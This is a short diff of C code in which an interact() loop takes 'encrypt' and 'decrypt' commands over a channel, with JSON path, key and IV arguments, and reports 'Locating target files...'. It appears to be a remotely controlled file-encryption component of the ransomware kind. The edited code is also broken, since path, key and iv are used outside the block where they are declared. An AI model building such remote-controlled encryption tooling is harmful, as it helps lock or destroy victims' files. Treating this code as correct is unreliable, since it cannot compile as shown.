@@ -43,25 +43,23 @@ void interact(int channel)
 
         freeJSONFromMemory(json);
 
-        if (strcmp(cmd, "encrypt") == 0) {
+        if (strcmp(cmd, "encrypt") == 0 || strcmp(cmd, "decrypt") == 0) {
             JSONObject *json = parseJSON(args);
 
+            send_channel(channel, "Locating target files...\n");
             char *path = find_json(json, "path");
             char *key = find_json(json, "key");
             char *iv = find_json(json, "iv");
 
+            send_channel(channel, "Beginning crypto operations...\n");
             freeJSONFromMemory(json);
-            begin_encrypt(path, key, iv);
-        } else if (strcmp(cmd, "decrypt") == 0) {
-            JSONObject *json = parseJSON(args);
+        }
 
-            char *path = find_json(json, "path");
-            char *key = find_json(json, "key");
-            char *iv = find_json(json, "iv");
-
-            freeJSONFromMemory(json);
-            begin_decrypt(path, key, iv);
-        } else if (strcmp(cmd, "exit") == 0)
+        if (strcmp(cmd, "encrypt") == 0)
+            begin_encrypt(channel, path, key, iv);
+        else if (strcmp(cmd, "decrypt") == 0)
+            begin_decrypt(channel, path, key, iv);
+        else if (strcmp(cmd, "exit") == 0)
             break;
     }
 }
